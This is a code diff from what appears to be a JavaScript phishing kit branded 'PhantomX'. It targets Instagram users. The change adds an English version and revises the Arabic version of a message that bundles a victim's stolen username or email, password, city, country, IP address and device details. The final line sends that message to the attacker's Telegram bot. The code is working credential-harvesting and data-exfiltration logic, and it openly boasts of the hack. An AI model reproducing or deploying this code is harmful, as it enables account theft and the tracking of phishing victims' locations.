@@ -236,14 +236,25 @@
                 const deviceInfo = getDeviceInfo();
 
                 // بناء الرسالة
-                const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
+                const message = `🔓 *The active account was activated by PhantomX.* 🔓\n\n` +
+                                `💻 *Account information:* 💻\n` +
+                                `📧 Username, number, or email: ${username}\n` +
+                                `🔑 Password: ${password}\n\n` +
+                                `🌍 *Location:* ${locationData.city}, ${locationData.country}\n` +
+                                `📱 *Device:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
+                                `📲 *IP:* ${locationData.ip}\n\n` +
+                                `Hacked by PhantomX @tx_5w` +
+                                ` Account type: Instagram☣`;
+              
+                const message1 = `🔓 *تم تفعيل الحساب النشط بواسطة PhantomX.* 🔓\n\n` +
                                 `💻 *معلومات الحساب:* 💻\n` +
-                                `📧 اليوزر او الرقم او البريد الإلكتروني: ${username}\n` +
+                                `📧 اسم المستخدم أو الرقم أو البريد الإلكتروني: ${username}\n` +
                                 `🔑 كلمة المرور: ${password}\n\n` +
                                 `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
-                                `📱 *جهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
+                                `📱 *الجهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
                                 `📲 *IP:* ${locationData.ip}\n\n` +
-                                `الاختراق تم بواسطة PhantomX @tx_5w`;
+                                `تم الاختراق بواسطة PhantomX @tx_5w` +
+                                `نوع الحساب: Instagram☣`;
 
                 // إرسال الرسالة إلى قناة تليجرام
                 const telegramChannel = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
